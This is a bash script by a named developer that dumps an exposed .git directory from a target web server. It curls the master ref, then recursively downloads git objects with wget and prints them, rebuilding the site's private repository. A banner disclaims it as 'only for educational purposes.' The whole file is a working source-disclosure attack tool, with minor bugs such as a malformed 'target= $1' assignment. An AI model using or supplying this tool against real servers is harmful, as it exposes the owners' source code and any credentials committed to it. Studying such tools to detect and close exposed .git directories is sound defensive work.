#!/bin/bash

green='\033[1;32m'
NC='\033[0m' # No Color

function banner () 
{
    echo -e "\n${green}------------------------------
\n## Developer: @eshaan7, github.com/eshaan7
## Use at your own risk. Usage might be illegal in certain circumstances. 
## Only for educational purposes!
	\n------------------------------\n${NC}"
}

function info ()
{
	echo -e "${green}\n------------------------------"
	echo -e "[+] Downloaded /.git/objects/${1:0:2}/${1:2}"
	echo -e "------------------------------${NC}"
	git cat-file -p $1
}

function recursive_get () 
{
	wget --quiet ${target}/.git/objects/${1:0:2}/${1:2} -P .git/objects/${1:0:2}/ > /dev/null
	git cat-file -p ${1} | sed 's/\s\+/ /g' | cut -d " " -f3 | grep -E '[a-z0-9]{40}' |
	while read o 
	do
		recursive_get $o
		info $o
	done;
}

function get () 
{
	wget --quiet ${target}/.git/objects/${1:0:2}/${1:2} -P .git/objects/${1:0:2}/ > /dev/null
}

banner 

target= $1

mkdir -p /tmp/${target}-gitdump/
cd /tmp/${target}-gitdump/
git init

first=$(curl --silent http://${target}/.git/refs/heads/master 2>/dev/null)
get $first
info $first

next=$(git cat-file -p ${first} | cut -d " " -f2 | grep -E '[a-z0-9]{40}')
get $next
info $next

recursive_get $next 

